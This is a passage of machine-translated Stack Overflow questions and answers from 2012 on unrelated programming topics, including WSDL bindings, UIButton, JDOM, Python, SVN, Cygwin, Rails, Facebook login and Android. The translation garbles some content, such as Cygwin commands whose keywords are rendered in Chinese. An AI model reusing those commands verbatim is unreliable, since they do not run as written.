调用 wsimport 的命令行如下：

```
O:\temp\wsdltest>wsimport -extension -Xdebug -s src -b bindings.xjb TMDD-stripped.wsdl 
```

我该怎么做才能正确创建“DlFullEventUpdateSubscription”操作？是否有任何替代方法可以生成 Java Web 服务？我不能修改操作定义，因为那不符合标准。

**更新。解决方案**

我设法通过修改 WSDL 使其工作，因此消息的每个部分都分配给标题和正文：

```
<binding name="tmddOCSoapHttpServiceBinding" type="tns:tmddOCSoapHttpServicePortType">
    <soap:binding style="document"
        transport="http://schemas.xmlsoap.org/soap/http" />
    <operation name="DlFullEventUpdateSubscription">
        <soap:operation soapAction="' '" style="document" />
        <input>
            <soap:header message="tns:MSG_EventSubscription" use="literal" part="c2cMsgAdmin"/>
            <soap:body use="literal" parts="message"/>
        </input>
        <output>
            <soap:body use="literal" />
        </output>
        <fault name="errorReport">
            <soap:fault name="errorReport" use="literal" />
        </fault>
    </operation>
</binding> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T09:43:38.380

Document-Literal 不能有多部分消息操作。您可以使用以下替代方案。

*   使用 Document/Literal Wrapped 样式 - 将多个部分包裹在一个文档中。
*   使用 RPC/Literal 样式 - 在皂体中绑定多个部分没有限制。

谢谢，斯里哈里。

# uibutton - 具有自定义背景的 UIButton 失去标题

> ID：10597271
> 
> 赞同：1
> 
> 时间：2012-05-15T08:54:16.357
> 
> 标签：uibutton

我试图创建一个自定义按钮，但是设置图像后，我注意到标题消失了，它认为这是因为我在按钮上添加了一个图像，它与标题重叠。

```
UIImage *pickerBg = [UIImage imageNamed:@"btn_picker.png"];
UIImage *pickerBg_highlighted = [UIImage imageNamed:@"btn_picker_highlighted.png"];

[projectBtn setImage:pickerBg forState:UIControlStateNormal];
[projectBtn setImage:pickerBg_highlighted forState:UIControlStateHighlighted]; 
```

还有其他方法可以做到这一点吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-24T09:58:50.537

使用 setBackgroundImage，而不是 setImage

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-19T13:58:40.140

```
UIImage *pickerBg = [UIImage imageNamed:@"btn_picker.png"];
UIImage *pickerBg_highlighted = [UIImage imageNamed:@"btn_picker_highlighted.png"];
[projectBtn setBackgroundImage:pickerBg forState:UIControlStateNormal];
[projectBtn setBackgroundImage:pickerBg_highlighted forState:UIControlStateHighlighted];
[projectBtn setTitle:@"aTitle" forState:UIControlStateNormal]; 
```

使用它来设置带有标题的图像。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-15T09:12:43.960

使用您需要的标题创建一个 UILabel，然后将其作为子视图添加到您的 UIButton。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-08-25T11:28:48.137

创建UIButton时，使用setImage设置ButtonImage会改变title的位置，titleText和image在同一层，titleText在image后面，所以可以setBackImage，image会在titleText后面，但是，图像将作为按钮紧张。

# axapta - 定义 AIF 通道时出错

> ID：10597273
> 
> 赞同：0
> 
> 时间：2012-05-15T08:54:23.317
> 
> 标签：axapta, dynamics-ax-2009

我正在使用 Dynamic Ax 2009 的客户端实例。

在为 AIF 定义通道时，我遇到了一个错误，错误消息如下所示。

“路径 %1 没有文件写入权限”。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T15:38:16.083

在方法上设置断点`info.add`。然后向后工作。

# xml - 使用 JDOM 保留重复的命名空间声明

> ID：10597274
> 
> 赞同：0
> 
> 时间：2012-05-15T08:54:23.580
> 
> 标签：xml, namespaces, xml-parsing, sax, jdom

我正在尝试读取具有重复命名空间声明的现有 xml 文件。对我来说，留下这些声明以供进一步处理很重要。早些时候我使用 org.w3c.dom api 的 XERCES 实现来读取这样的文档，并且所有声明都留下了，但是当我开始使用 JDOM 时，它开始省略多余的命名空间声明。

这是示例 xml 文件：

```
<?xml version="1.0" encoding="UTF-8"?>
<document xmlns:ns="namespace_uri">
  <element1>...</element1>
  <element2>
    <ns:child>
      text
    </ns:child>
  <element3 xmlns:ns="namespace_uri">
    <ns:child>
      content
    </ns:child>
  </element3>
</document> 
```

我正在使用以下代码构建 JDOM 文档：

```
SAXBuilder builder = new SAXBuilder();
File inputXml = new File(inputFile);
jdomInDoc = builder.build(inputXml); 
```

有什么方法可以强制 JDOM 不要省略多余的命名空间声明？

预先感谢您的回答。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T09:32:03.910

目前在 JDOM 中没有办法留下多余的命名空间声明。有可能，甚至有可能，如果您愿意，您可以覆盖 XMLOutputter 以输出重复项。我可以调查一下。

我已经打开了第 83 期[https://github.com/hunterhacker/jdom/issues/83](https://github.com/hunterhacker/jdom/issues/83)

这是可以潜在添加到 JDOM 格式系统的东西

无论如何，我将研究这在 JDOM 中是否可以通过自定义实现......

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T11:04:31.020

什么样的软件会接收这个 XML 并根据是否存在冗余命名空间声明来区别对待它？同一种软件可能只处理由单引号分隔的属性，或者只处理包含在 CDATA 部分中的文本？

Xerces 或 JDOM 等通用 XML 软件有权假定接收者是行为良好的 XML 使用者，这意味着它不会为词汇 XML 表示的意外附加意义，例如引号的选择、CDATA 的使用，或存在冗余命名空间绑定。

# python - python的逻辑错误

> ID：10597276
> 
> 赞同：-2
> 
> 时间：2012-05-15T08:54:30.803
> 
> 标签：python

我写了这个简单的代码，我认为它不包含语法错误但它不执行所以我认为这是一个逻辑错误：o，所以我需要帮助！有人可以救我吗？！:D

```
class NumberGenerator:
"""A simple class that contains functions to generate ranges of numbers"""

@classmethod
def generate(quantity, value=[]):
    while quantity: value.append(quantity) ; quantity -= 1
    return value

class Figure:
"""Abstract class for geometric figures"""

def init(self, name):
    """This is the constructor"""
    self._name = name

def name(self):
    return self._name

class Rectangle(Figure):
"""Rectangle figure"""

def init(self, width, height):
    Figure.__init__("rectangle")
    self._width = width
    self._height = height

def width(self):
    return self.width

def height(self):
    return self.height

def size(self):
    self.width() * self.height()

if __name__ == "__main__":
# We print the range(10,0,-1)
print NumberGenerator.generate(10)
# We print the range(20,0,-1)
print NumberGenerator.generate(20)

# We create a rectangle
r = Rectangle(10, 20)
print r.size()

# EOF 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-15T09:00:33.463

除了缩进，这里有两个错误：

```
def width(self):
    return self.width

def height(self):
    return self.height 
```

这应该是：

```
def width(self):
    return self._width

def height(self):
    return self._height 
```

此外，应该调用构造函数`__init__`而不是`init`.

最后，该`generate()`方法有几个问题：

*   您可能是想说`@staticmethod`而不是`@classmethod`（类方法应该采用隐式的第一个参数，而您的方法没有）。
*   循环是不必要的（一个简单的`range()`调用就可以了）。
*   该方法有一个微妙的错误，其中第二个参数 ( `value`) 在对`generate()`. 如果必须扩展`value`，请移至`value = []`方法的主体。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-15T09:03:21.453

您的第一条错误消息`AttributeError: 'int' object has no attribute 'append'`来自`NumberGenerator.generate`no`self`作为第一个参数，然后将变量创建`quantity`为`NumberGenerator`.

一旦你解决了这个问题，你的下一个错误实际上`init()`应该是`__init__()`，一旦你解决了这个问题，你就会有另一个错误，但我会把这个练习留给你自己。

# xml - 如何在 XML 中描述简单值的列表？

> ID：10597277
> 
> 赞同：0
> 
> 时间：2012-05-15T08:54:40.383
> 
> 标签：xml

我正在尝试为 XML 格式和 JSON 格式提出一个模式，其中可以嵌套一个非常灵活的数据模型。JSON 的乐趣之一是，尽管它缺乏模式，但它允许仅使用语法来构建令人惊讶的准确模型，而不必诉诸“约定”来表示我的模型的特定部分。例如，我可以将简单值列表表示为 JSON 数组：

```
{"list": [1, 2, "Hello", { "name":"irrelevant" }, 5, 6]} 
```

而在 XML 中，我必须将每个值包装在它自己的子元素中：

```
<list>
  <value>1</value>
  <value>2</value>
  <value>Hello</value>
  <object name="irrelevant" />
  <value>5</value>
  <value>6</value>
</list> 
```

在我允许的范围内，我必须非常灵活。例如，一个列表应该能够包含 JSON 列表所包含的值的类型（并且通常是无类型的）。我敢打赌，我没有使用命名空间，这让我之前的例子很容易出错。

是否有更优雅的方式来描述 XML 中的简单值列表？

# svn - SVN - 文件夹自动合并

> ID：10597278
> 
> 赞同：0
> 
> 时间：2012-05-15T08:54:40.503
> 
> 标签：svn

有没有办法在SVN中自动合并2个文件夹之间的差异？？？

假设我有这个文件夹结构。

文件夹1

*   源/主/java
    *   com.app.func1
        *   文件 1
        *   文件2
    *   com.app.func1.some2
        *   文件 3
        *   文件4

文件夹2

*   源/主/java
    *   com.app.func1
        *   文件 1（与文件夹 1 的文件 1 略有不同）
        *   文件 2（与文件夹 1 的文件 2 相同）
    *   com.app.func1.some2
        *   文件 3（不同于文件夹 1 的文件 3）
        *   文件 4（与文件夹 1 的文件 4 相同）

如果我给 2 个文件夹，则必须比较文件夹 1 和文件夹 2，并且文件夹 2 的差异（如果存在）必须是

自动合并到文件夹1，输出必须自动生成，看起来像，

文件夹1

*   源/主/java
    *   com.app.func1
        *   文件 1
        *   文件2
    *   com.app.func1.some2
        *   文件 3
        *   文件4

Clearcase 会这样做。但我只想知道 SVN 是否会做这样的事情。如果是意味着如何？

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T09:03:11.133

在文件夹 1 的工作副本中从文件夹 1 合并到文件夹 2，然后提交。

[这是文档](http://svnbook.red-bean.com/en/1.7/svn-book.html#svn.ref.svn.c.merge)中解释的 2-URL 合并。

# python - 在cygwin中安装python和make

> ID：10597284
> 
> 赞同：20
> 
> 时间：2012-05-15T08:55:21.377
> 
> 标签：python, windows, makefile, cygwin, installation

我已经在 OS Windows 中安装了 Cygwin 终端。但我还需要在 cygwin 中安装 python 和 make。运行 petsc 库需要所有这些程序。有人知道如何在 cygwin 中安装这些组件吗？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-05-15T08:58:33.500

查看 cygwin 本机包管理器，`devel`类别。你应该在`make`那里找到`python`。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2018-01-03T06:28:50.073

要安装 Python 2：运行[https://cygwin.com/setup-x86.exe](https://cygwin.com/setup-x86.exe)或[https://cygwin.com/setup-x86_64.exe](https://cygwin.com/setup-x86_64.exe)并选择：

[![在此处输入图像描述](../Images/27bdd1acf476c159addf653ff5382d44.png)](https://i.stack.imgur.com/um6hr.png)

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2013-10-03T19:49:21.610

在自己遇到这个问题后，我忽略了所有相关的答案，说要`setup.exe`再次检查。这是我的解决方案，有一些具体的事情需要检查。

1.  检查 /bin 是否有“make.exe”。如果它不存在，则说明您没有正确安装它
2.  运行`setup.exe`. 不要害怕，因为新软件包安装会*附加*到您的安装中并且不要过度写入
3.  在 中`setup.exe`，确保从*Internet*而不是本地文件夹运行安装。这就是我遇到问题的地方。搜索“make”并确保选择安装它，不要将其保留为“默认”。

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2012-05-15T19:55:50.360

@spacediver 是正确的。再次运行 cygwin `setup.exe`，当您进入软件包屏幕时，请确保您选择`make`和`python`（以及您可能需要的任何其他库/应用程序 - 可能是 gcc 或 g++）。

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2017-03-30T22:01:31.763

这是在cygwin中安装python的命令行版本

wget rawgit.com/transcode-open/apt-cyg/master/apt-cyg

安装 apt-cyg /bin

apt-cyg 安装 python

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2019-11-04T11:23:44.750

就我而言，这是由于没有很好地安装python而发生的。所以在shell中引用了python.exe所以找不到文件，因为系统不同。请检查 cygwin python 是否安装好。

# jquery - 如何获取基于 JQuery 远程类的验证规则的值和元素？

> ID：10597286
> 
> 赞同：2
> 
> 时间：2012-05-15T08:55:31.273
> 
> 标签：jquery, validation

我正在尝试编写一个规则来使用远程查找验证多个动态添加的输入。我不知道如何获取远程规则定义中正在验证的字段。例如：

```
$.validator.addClassRules({
    refDataAcInput: {
        remote: {
            url: "/json/refDataLookup.html",
            type: "get",
            data: {
                groupName: function(a,b,c){
                    //$(this).data("groupName");
                    //THE ABOVE DOESN'T WORK, HERE I WANT TO GET THE VALUE OF THE FIELD BEING VALIDATED
                },
                term: function(a,b,c){
                    //$(this).val();
                    //THE ABOVE DOESN'T WORK, HERE I WANT TO GET THE VALUE OF THE FIELD BEING VALIDATED
                },
                exactMatch: "true"
            },
            dataFilter: function(data, type) {
                return data;
            },
            success: function(data, textStatus, jqXHR) {
                alert(textStatus);
            }
        }
    }
}); 
```

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T15:50:38.463

我真的很喜欢你的想法，但是你想做的事情不能像现在这样使用 addClassRules 来完成。问题不在于 jQuery Validate，而更多在于 jQuery.ajax 在生成数据时的工作方式。数据对象中的那些函数不使用上下文调用（即，`this`如您所料那样填充）。jQuery 代码如下所示：

```
value = jQuery.isFunction( value ) ? value() : value; 
```

我相信这是有道理的，因为 $.ajax 的普遍使用方式，它可以访问局部变量，这样就没有关系（即在调用 $.ajax 之前，您只需创建所需的数据对象）。对于 Validate 的情况，您唯一的选择可能是使用由 提供的数据`remote`，即输入名称作为键，输入的值作为值（即`fieldName:value`）并修改您的远程脚本来处理它。

如果因为需要`groupName`数据而无法选择，则可以考虑编辑[源代码](https://github.com/jzaefferer/jquery-validation/blob/master/jquery.validate.js#L1024)。在这种情况下我会做的是改变这一行（github中的L1024）：

```
data[element.name] = value; 
```

对此：

```
data = $(element).data();
data[element.name] = value; 
```

这会将`jQuery.data`附加到您的元素的任何值推送到您的 ajax 请求中。

# ruby-on-rails - 无法启动 Rails 控制台

> ID：10597288
> 
> 赞同：1
> 
> 时间：2012-05-15T08:55:32.843
> 
> 标签：ruby-on-rails, ubuntu, rvm

Rails 控制台在我的生产服务器上不起作用。这是发生的事情：

```
root@myapp:/webapps/myapp/current# rails c
/usr/local/rvm/rubies/ruby-1.9.3-p194/lib/ruby/site_ruby/1.9.1/rubygems/custom_require.rb:36:in `require': cannot load such file -- rails/cli (LoadError)
    from /usr/local/rvm/rubies/ruby-1.9.3-p194/lib/ruby/site_ruby/1.9.1/rubygems/custom_require.rb:36:in `require'
    from /usr/local/rvm/gems/ruby-1.9.2-p180@rails/gems/rails-3.0.5/bin/rails:8:in `rescue in <main>'
    from /usr/local/rvm/gems/ruby-1.9.2-p180@rails/gems/rails-3.0.5/bin/rails:3:in `<main>' 
```

以前我收到与 Readline 相关的错误，在这里解释：[Rails 控制台、RVM 和 readline 的问题](https://stackoverflow.com/questions/4498919/problems-with-the-rails-console-rvm-and-readline)

我尝试了 propsoed 修复，现在我没有收到 readline 错误。控制台仍然无法启动。

这是 rvm 信息输出：

```
ruby-1.9.3-p194:

  system:
    uname:       "Linux 111items 2.6.38-linode31 #1 SMP Mon Mar 21 21:22:33 UTC 2011 i686 GNU/Linux"
    bash:        "/bin/bash => GNU bash, version 4.1.5(1)-release (i486-pc-linux-gnu)"
    zsh:         " => not installed"

  rvm:
    version:      "rvm 1.13.4 () by Wayne E. Seguin <wayneeseguin@gmail.com>, Michal Papis <mpapis@gmail.com> [https://rvm.io/]"
    updated:      "53 minutes 38 seconds ago"

  ruby:
    interpreter:  "ruby"
    version:      "1.9.3p194"
    date:         "2012-04-20"
    platform:     "i686-linux"
    patchlevel:   "2012-04-20 revision 35410"
    full_version: "ruby 1.9.3p194 (2012-04-20 revision 35410) [i686-linux]"

  homes:
    gem:          "/usr/local/rvm/gems/ruby-1.9.3-p194"
    ruby:         "/usr/local/rvm/rubies/ruby-1.9.3-p194"

  binaries:
    ruby:         "/usr/local/rvm/rubies/ruby-1.9.3-p194/bin/ruby"
    irb:          "/usr/local/rvm/rubies/ruby-1.9.3-p194/bin/irb"
    gem:          "/usr/local/rvm/rubies/ruby-1.9.3-p194/bin/gem"
    rake:         "/usr/local/rvm/gems/ruby-1.9.3-p194@global/bin/rake"

  environment:
    PATH:         "/usr/local/rvm/gems/ruby-1.9.3-p194/bin:/usr/local/rvm/gems/ruby-1.9.3-p194@global/bin:/usr/local/rvm/rubies/ruby-1.9.3-p194/bin:/usr/local/rvm/bin:/usr/local/bin:/usr/local/sbin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games"
    GEM_HOME:     "/usr/local/rvm/gems/ruby-1.9.3-p194"
    GEM_PATH:     "/usr/local/rvm/gems/ruby-1.9.3-p194:/usr/local/rvm/gems/ruby-1.9.3-p194@global"
    MY_RUBY_HOME: "/usr/local/rvm/rubies/ruby-1.9.3-p194"
    IRBRC:        "/usr/local/rvm/rubies/ruby-1.9.3-p194/.irbrc"
    RUBYOPT:      ""
    gemset:       "" 
```

在本地，我总是能够启动 rails 控制台，但在远程机器上有些不同。

upd：到目前为止，我最好的猜测是 Rails 缺少“rails/cli”的正确路径。必须进行研究，看看如何解决这个问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T09:43:48.467

以普通用户身份安装 RVM 后，以普通用户身份重试。就我而言，以*root*
身份安装 RVM是一件痛苦的事，尤其是路径问题。

 ** * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T11:41:16.513

如果这不起作用，您可以随时切换到 rbenv。它更轻，并且在本地主机上拥有您需要的一切*

# facebook - fb:login-button not show , no code changed

> ID：10597292
> 
> 赞同：3
> 
> 时间：2012-05-15T08:55:40.213
> 
> 标签：facebook

today somebody reports me that the "Facebook login button" suddenly disappear, on his website that i made , actually yesterday was working ok, and i did not change any code at all for weeks , i have activated the July, August Changes since i made the website, in order to avoid this problems

this is my code

```
 <div id="fb-root"></div>
        <div class="fb-login-button" onlogin="Facebook_login()" autologoutlink="true">Login with Facebook</div> 
        <script>
            window.fbAsyncInit = function() {
            FB.init({
                    appId      : 'FB APP ID',
                    status     : false, 
                    cookie     : true,
                    xfbml      : true,
                    oauth      : true
                });
            };

            (function(d){
            var js, id = 'facebook-jssdk'; if (d.getElementById(id)) {return;}
            js = d.createElement('script'); js.id = id; js.async = true;
            js.src = "//connect.facebook.net/en_US/all.js";
            d.getElementsByTagName('head')[0].appendChild(js);
            }(document));

          function Facebook_login () {
            FB.getLoginStatus(function(response) {
                if (response.status === 'connected') {
                    window.location = "THE URL TO PROCESS THE LOGIN";

                }
            });
          }                
        </script> 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-15T09:55:22.193

We experienced the same issue on our website. Looks like Facebook has changed the implementation of the login button, it is now created within an iframe. It also no longer supports the 'onlogin' attribute (no longer in the [docs](http://developers.facebook.com/docs/reference/plugins/login/)).

We fixed by adding our own button, using the FB SDK FB.login method.

For you it would look something similar to (assuming you use jQuery for the click event)

```
<div id="fb-root"></div>
        <button class="fb_login">Login with Facebook</button> 
        <script>
            window.fbAsyncInit = function() {
               FB.init({
                    appId      : 'FB APP ID',
                    status     : false, 
                    cookie     : true,
                    xfbml      : true,
                    oauth      : true
                });
                $(".fb_login").click(function() {
                   FB.login(Facebook_login);
                }); 
            };

            (function(d){
            var js, id = 'facebook-jssdk'; if (d.getElementById(id)) {return;}
            js = d.createElement('script'); js.id = id; js.async = true;
            js.src = "//connect.facebook.net/en_US/all.js";
            d.getElementsByTagName('head')[0].appendChild(js);
            }(document));

          function Facebook_login () {
            FB.getLoginStatus(function(response) {
                if (response.status === 'connected') {
                    window.location = "THE URL TO PROCESS THE LOGIN";

                }
            });
          }                
        </script> 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-15T09:55:47.563

Hi you are not the only one experiencing trouble since today.
My website isn't displaing correctly the button and the login is broken, too.
This seems to be a bug on Facebook side, introduced with today's update, see here: [http://developers.facebook.com/bugs/386085844776949](http://developers.facebook.com/bugs/386085844776949) and here [http://developers.facebook.com/bugs/250500218391321](http://developers.facebook.com/bugs/250500218391321)
Try subscribing to the bugs to have FB look at them.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2021-05-10T09:28:59.773

Sometimes, it happens due to not re-initializing the Fb.init function. I solved this problem by parsing Fb.XFBML and i added FB.XFBML.parse(); in script tag just before fb-login button as : `<script>FB.XFBML.parse();</script>[enter image description here][1] <fb:login-button scope="public_profile,email" onlogin="checkLoginState();"> </fb:login-button>`

You can see a sample of code here: [1]: [https://i.stack.imgur.com/YM7QM.png](https://i.stack.imgur.com/YM7QM.png)

# android - android上的asp.net mvc 2 + jquery mobile

> ID：10597293
> 
> 赞同：1
> 
> 时间：2012-05-15T08:55:41.070
> 
> 标签：android, jquery-mobile, drop-down-menu

我开发的 Web 应用程序包含一个下拉列表，由以下代码生成：

`<%= Html.DropDownListFor(m => m.Subcategory_Id, Model.Subcategories as IEnumerable<SelectListItem>)%>`

下拉列表在 android 平台上不可选择，我看到有人建议使用

```
data-native-menu="true" 
```

但是如何将属性添加到代码中？请告知。

谢谢大家。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T09:31:37.293

您可以通过模型字段名称访问您的控件，以便您可以通过这种方式应用此标签

$("#Subcategory_Id").attr("data-native-menu", "true");

您应该在 jquery mobile 的 pagecreate 事件上设置此属性，请参阅下面的链接 [http://jquerymobile.com/test/docs/api/events.html](http://jquerymobile.com/test/docs/api/events.html)

# android - 在 AsyncTask 我想要列表视图中的数据

> ID：10597295
> 
> 赞同：0
> 
> 时间：2012-05-15T08:55:43.390
> 
> 标签：android, android-listview

嗨朋友我只想在列表视图中显示数据我使用异步任务我完成了在 json 中获取数据并按 id 和标题过滤它现在我在列表视图中显示 id 和标题你能帮我提前谢谢

```
 public class runActivity extends Activity implements OnClickListener {
  String returnString="";
  @Override
  public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);
    findViewById(R.id.my_button).setOnClickListener(this);
}

@Override
public void onClick(View arg0) {
    Button b = (Button)findViewById(R.id.my_button);
    b.setClickable(false);
    new LongRunningGetIO().execute();
}

private class LongRunningGetIO extends AsyncTask <Void, Void, String> {

    protected String getASCIIContentFromEntity(HttpEntity entity) throws IllegalStateException, IOException {
       InputStream in = entity.getContent();
         StringBuffer out = new StringBuffer();
         int n = 1;
         while (n>0) {
             byte[] b = new byte[4096];
             n =  in.read(b);
             if (n>0) out.append(new String(b, 0, n));
         }
         return out.toString();
    }

    @Override
    protected String doInBackground(Void... params) {
         HttpClient httpClient = new DefaultHttpClient();
         HttpContext localContext = new BasicHttpContext();
         HttpGet httpGet = new HttpGet("http://192.168.1.156/recess/document/document.json");
         HttpClient client = new DefaultHttpClient();
         HttpResponse response=null;
         try{
          response = client.execute(httpGet);}
         catch(Exception e){}
         System.out.println(response.getStatusLine());
         String text = null;
         try {
                response = httpClient.execute(httpGet, localContext);
               HttpEntity entity = response.getEntity();
               text = getASCIIContentFromEntity(entity);
         } catch (Exception e) {
             return e.getLocalizedMessage();
         }
         String var =text;             
         try{
          JSONObject jObj = new JSONObject(var);
          JSONArray jArray = jObj.getJSONArray("document");
             for(int i=0;i<jArray.length();i++){

                     JSONObject json_data = jArray.getJSONObject(i);
                     Log.i("log_tag","id: "+json_data.getString("id")+
                             ", title: "+json_data.getString("title")
                     );
                     returnString += "\n" +"id:"+ json_data.getString("id")+" "+"Title:"+              json_data.getString("title");

                     }

     }
     catch(JSONException e){
             Log.e("log_tag", "Error parsing data "+e.toString());
     }
         return returnString;
    }   

    protected void onPostExecute(String results) {
        if (results!=null) {
            ListView listView = (ListView) findViewById(R.id.mylist);
            listView.setFilterText(results);
        }
        Button b = (Button)findViewById(R.id.my_button);
        b.setClickable(true);
    }
 }
 } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T09:00:16.747

您将需要构建一个与 ListAdapter 一起使用的数组。

这是来自 Google 的指南：http: [//developer.android.com/resources/tutorials/views/hello-listview.html](http://developer.android.com/resources/tutorials/views/hello-listview.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T09:07:12.120

在 doInBackground "for" 循环中，只需创建数据数组或将数据放入对象数组列表中（然后需要编写自定义适配器）

对于 1- 选项 [http://www.java-samples.com/showtutorial.php?tutorialid=1516](http://www.java-samples.com/showtutorial.php?tutorialid=1516) http://www.ezzylearning.com/tutorial.aspx?tid=1659127&q=binding-android-listview-with-string -array-using-arrayadapter

对于 2- 选项

[http://www.ezzylearning.com/tutorial.aspx?tid=1763429&q=customizing-android-listview-items-with-custom-arrayadapter](http://www.ezzylearning.com/tutorial.aspx?tid=1763429&q=customizing-android-listview-items-with-custom-arrayadapter)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-15T08:59:57.700

我认为最好的解决方案是在您的活动中创建一个处理程序。然后，您可以向处理程序发送消息并获取数据并将其放入 ListView。

# c# - c#，ListBox中有OnChange事件吗？

> ID：10597299
> 
> 赞同：4
> 
> 时间：2012-05-15T08:55:56.717
> 
> 标签：c#, events, onchange

我一直在寻找类似的东西，但我找不到。我希望我的程序在有任何更改时执行某些操作`ListBox`（例如更改所选项目、添加新项目、删除项目等等）

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-15T09:03:58.427

您可以使用[SelectedIndexChanged](http://msdn.microsoft.com/en-us/library/system.windows.forms.listbox.selectedindexchanged.aspx)或[SelectedValueChanged](http://msdn.microsoft.com/en-us/library/system.windows.forms.listcontrol.selectedvaluechanged.aspx)事件。

对于添加或删除项目，没有 .NET 事件，因此您必须自己实现该功能。[这篇 SO 帖子](https://stackoverflow.com/questions/655956/how-to-detect-if-items-are-added-to-a-listbox-or-checkedlistbox-control)解释了如何做到这一点。

祝你好运！

PS：我假设你正在使用`Windows Forms`

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-15T09:19:27.470

如果你绑定你`ListBox`说 a `BindingList`，你可以使用`BindingLists`'`ListChanged`事件。有`ListChangedEventArgs`一个参数`ListChangedType`告诉你一个项目是否被添加、删除、移动或更改。

你可以用相似的集合做相似的事情。

如果您自己添加或删除项目，您显然可以直接告诉其他一些代码执行，或者您可以自己创建并引发一个事件，前提是您有一个`ListAdded`事件：

```
ListAdded(this, new ListAddedEventArgs() { List = myList, Item = myItem }); 
```

# javascript - 将 InfoPath 表单转换为 PDF 文件

> ID：10597301
> 
> 赞同：1
> 
> 时间：2012-05-15T08:55:58.667
> 
> 标签：javascript, pdf, sharepoint-2010, pdf-generation, infopath2010

（我为我的英语道歉，但这不是我的母语^^）

我想对将 InfoPath 形式的恢复原状转换为 PDF 发表意见。总之，我显示了一个连接到 InfoPath 表单 vizialisation 的 WebPat 的列表的 WebPart，我想对 PDF 文件执行提取。

我的第一个解决方案是使用 iTextSharp 库制作自定义操作列表项以生成 PDF。问题：开发三个表单（InfoPath 表单编辑、InfoPath 阅读表单和代码生成的 PDF 表单）的时间成本。

第二种解决方案是在 JavaScript 中检索 WebPart 的内容以将 HTML 数据转换为 PDF，但这似乎不是很干净的技术。

最后一个解决方案是创建一个包含包含 InfoPath 表单的 XmlFormView 的自定义页面，通过在 InfoPath 表单中的 InfoPath 按钮上添加一些代码，可以在该页面上执行提取。在外部，无法在用于 SP 表单的 dll Microsoft.Office.InfoPath.dll 中访问 Export 方法。而且我还担心无法在 InfoPath 表单上链接我的列表视图的 Web 部件。

在您看来，最好的解决方案是什么？解决它的最佳方法是什么？

先感谢您

# java - android 应用程序会收到有关系统区域设置更改的消息吗？

> ID：10597305
> 
> 赞同：1
> 
> 时间：2012-05-15T08:56:06.960
> 
> 标签：java, android, android-ndk, java-native-interface

在 JNI 方法中，我使用对 Java 对象的调用来获取语言环境设置。

我的 JNI 调用类似于我用来获取它的 Locale.getDefault()。

是否会通知应用程序有关系统区域设置的更改？

**所以，典型的用例：**

1.  运行我的应用程序。
2.  在本机代码中从 Locale.getDefault() 获取语言环境；
3.  通过设备上的设置菜单更改当前系统区域设置。
4.  在本机代码中从 Locale.getDefault() 获取语言环境；

**我会在第 4 步中获得有关当前语言环境的实际信息吗？**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T09:00:08.400

为此广播了一个 Intent，`ACTION_LOCALE_CHANGED`应该让您知道偏好何时发生变化。但是，如果您在更改后调用它而没有收到通知，您仍然会获得新的语言环境信息。

[http://developer.android.com/reference/android/content/Intent.html#ACTION_LOCALE_CHANGED](http://developer.android.com/reference/android/content/Intent.html#ACTION_LOCALE_CHANGED)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-16T05:56:16.667

**我会在第 4 步中获得有关当前语言环境的实际信息吗？**

好，我会的。

但是有一个问题：

如果主要活动被本地调用阻止，则区域设置信息将不会改变，直到主要活动没有收到 ACTION_LOCALE_CHANGED。

# javascript - 操作显示日期时间的 Json 字符串

> ID：10597306
> 
> 赞同：1
> 
> 时间：2012-05-15T08:56:17.763
> 
> 标签：javascript, html, json

在我问你我的问题之前，让我向你展示我的代码，对于你的信息：`meetings_String.TABLE[0].ROW[(j)].COL[5].DATA`sql server 中的 dateTime 对象是否具有格式`dd/mm/yyyy AM hh:mm:ss`.....我的代码是

```
meetingsSDate=meetings_String.TABLE[0].ROW[(j)].COL[5].DATA; //meetingsSdate now has data in the format of 'dd/mm/yyyy AM hh:mm:ss'

Meet_startTime=meetingsSDate.replace(/\d\d\/\d\d\/\d\d\d\d /i,'');// Meet_startTime now has data in the format of 'AM hh:mm:ss' 
```

我想在 javascript 中使用 Meet_startTime（或其他）创建另一个字符串，其格式类似于 HH:MM am 或 pm（24 小时制会更好）

PS：希望你能理解我的问题

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T09:00:20.523

最好将您的值解析为实际`Date`对象，而不是仅仅以不同的方式操作字符串。从 Date 对象中，您可以提取日期和时间部分，并以您想要的任何顺序组合它们。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T09:02:56.470

你可以试试...

```
